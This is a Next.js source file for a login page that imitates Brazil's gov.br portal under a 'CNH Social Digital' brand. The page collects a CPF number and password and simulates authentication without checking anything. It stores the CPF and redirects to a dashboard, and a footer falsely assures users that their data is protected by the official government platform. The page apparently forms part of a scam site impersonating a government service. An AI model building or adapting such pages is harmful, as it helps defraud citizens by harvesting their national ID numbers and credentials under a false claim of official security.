"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { User, Lock, Eye, EyeOff } from "lucide-react"

export default function LoginPage() {
  const [cpf, setCpf] = useState("")
  const [senha, setSenha] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    if (formatted.length <= 14) {
      setCpf(formatted)
    }
  }

  const handleLogin = async () => {
    if (!cpf || !senha) {
      alert("Por favor, preencha todos os campos")
      return
    }

    setIsLoading(true)

    // Simular delay de autenticação
    setTimeout(() => {
      // Salvar dados do usuário no sessionStorage
      sessionStorage.setItem("user-logged", "true")
      sessionStorage.setItem("user-cpf", cpf)

      setIsLoading(false)
      router.push("/dashboard")
    }, 2000)
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header gov.br */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <img src="/images/govbr-logo.png" alt="gov.br" className="h-8" />
        </div>
      </div>

      {/* Conteúdo principal */}
      <div className="max-w-md mx-auto px-6 py-8">
        {/* Logo CNH Social Digital */}
        <div className="mb-8 text-center">
          <img src="/images/cnh-logo-oficial.png" alt="CNH Social Digital" className="w-48 h-auto mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-blue-800">Entrar com gov.br</h1>
          <p className="text-gray-600 mt-2">Acesse sua conta para continuar</p>
        </div>

        {/* Formulário de login */}
        <div className="space-y-6">
          <div>
            <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-2">
              CPF
            </label>
            <div className="relative">
              <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                id="cpf"
                type="text"
                value={cpf}
                onChange={handleCpfChange}
                placeholder="000.000.000-00"
                className="pl-10 py-3 text-lg"
                maxLength={14}
              />
            </div>
          </div>

          <div>
            <label htmlFor="senha" className="block text-sm font-medium text-gray-700 mb-2">
              Senha
            </label>
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                id="senha"
                type={showPassword ? "text" : "password"}
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                placeholder="Digite sua senha"
                className="pl-10 pr-10 py-3 text-lg"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          <Button
            onClick={handleLogin}
            disabled={isLoading}
            className="w-full bg-blue-700 hover:bg-blue-800 text-white py-4 px-8 rounded-full text-lg font-semibold"
          >
            {isLoading ? (
              <div className="flex items-center">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                Entrando...
              </div>
            ) : (
              "Entrar"
            )}
          </Button>

          <div className="text-center">
            <a href="#" className="text-blue-600 text-sm hover:underline">
              Esqueci minha senha
            </a>
          </div>

          <div className="text-center">
            <a href="#" className="text-blue-600 text-sm hover:underline">
              Não tenho conta gov.br
            </a>
          </div>
        </div>

        {/* Informações de segurança */}
        <div className="mt-12 p-4 bg-blue-50 rounded-lg">
          <h3 className="font-semibold text-blue-800 mb-2">Segurança gov.br</h3>
          <p className="text-sm text-blue-700">
            Seus dados estão protegidos pela plataforma oficial do governo brasileiro. O login é realizado através do
            sistema gov.br com total segurança.
          </p>
        </div>
      </div>
    </div>
  )
}
